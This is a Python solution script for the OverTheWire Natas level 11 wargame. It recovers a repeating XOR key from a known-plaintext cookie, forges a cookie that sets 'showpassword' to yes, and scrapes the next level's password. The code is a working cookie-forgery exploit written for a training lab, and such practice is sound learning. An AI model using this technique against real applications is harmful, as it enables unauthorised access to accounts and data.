import requests
import sys
import argparse
import re
import time
import base64
import urllib.parse
   

def login(url, user, password, proxies=None):
    print("[+] Logging in as natas11...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = requests.get(url, auth=(user, password), proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)
    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)

    # Getting the value of "data" cookie
    cookie = response.cookies.get("data")
    # calling the getkey function and passing cookie to it
    data = getkey(cookie)
    return data

# Function to calculate the XOR key
def getkey(urlcookie):
    print("[+] Decrypting the cookie...")
    time.sleep(1)

    plaintext = '{"showpassword":"no","bgcolor":"#ffffff"}'
    # URL decode the cookie
    cookie= urllib.parse.unquote(urlcookie)
    # Base64 decode the cookie
    secret = base64.b64decode(cookie).decode("utf-8")
    key = ""
    i = 0
    print("[+] Calculating the XOR key...")
    time.sleep(2)
    # Calculating the XOR key
    while i < len(plaintext):
        key += chr(ord(plaintext[i]) ^ ord(secret[i]))
        i += 1
    key = key[:4]

    print(f"[+] The XOR key is: {key}")
    time.sleep(1)
    data = createcookie(key)
    return data

# Function to create a base64 cookie that gets the password
def createcookie(key):
    print("[+] Creating the new cookie...")
    time.sleep(3)
    text = '{"showpassword":"yes","bgcolor":"#ffffff"}'
    i = 0
    xorcookie = ""

    # Calculating a new cookie
    while i < len(text):
        xorcookie += chr(ord(text[i]) ^ ord(key[i % len(key)]))
        i += 1
    
    # Base64 encode the cookie
    cookie = base64.b64encode(xorcookie.encode('ascii'))
    print(f"[+] Created the cookie: {cookie.decode()}")
    time.sleep(1)

    data = {"data": cookie.decode()}

    return data


# Function to extract the password from the response
def getpass(url, user, password, data, proxies=None):
    print(f"[+] Getting the password...")
    time.sleep(1)

    cookies = data
    response = requests.get(url, auth=(user, password), cookies=cookies , proxies=proxies)
    content = response.text

    # Define regex pattern to find the password
    pattern = r"The password for natas12 is (.*)"
    # Using regex to search for password and extract it.
    passwd = (re.search(pattern, content).group(1)).split("<")[0]
    print(f"[+] The password of natas12 is: {passwd}")

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas12 by finding a XOR key and forging a cookie to get the password.")
    parser.add_argument('-p', '--password', help='Password of natas11.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    url = 'http://natas11.natas.labs.overthewire.org'
    user = 'natas11'
    password = args.password
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

    # Check if proxy option is enabled and perform login
    if args.proxy:
        data = login(url, user, password, proxies=proxies)
        getpass(url, user, password, data, proxies=proxies)

    else:
        data = login(url, user, password)
        getpass(url, user, password, data)
    
if __name__ == "__main__":
    main()